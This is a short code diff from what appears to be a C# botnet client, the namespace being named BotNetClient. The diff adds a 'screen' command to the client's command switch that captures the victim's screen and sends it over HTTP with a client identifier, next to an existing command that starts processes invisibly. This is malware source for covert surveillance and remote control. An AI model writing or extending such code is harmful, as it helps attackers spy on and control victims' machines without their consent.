@@ -22,6 +22,9 @@ namespace BotNetClient
             }
             switch (msg[0])
             {
+                case "screen":
+                    HttpHandler.Class1.ScreenSendAsync(Program.idc.ToString(), ProcessShowingTheScreen.Class1.code());
+                    break;
                 case "startinvis":
                     ProcessStartInvis.Class1.code(msg[1]);
                     break;
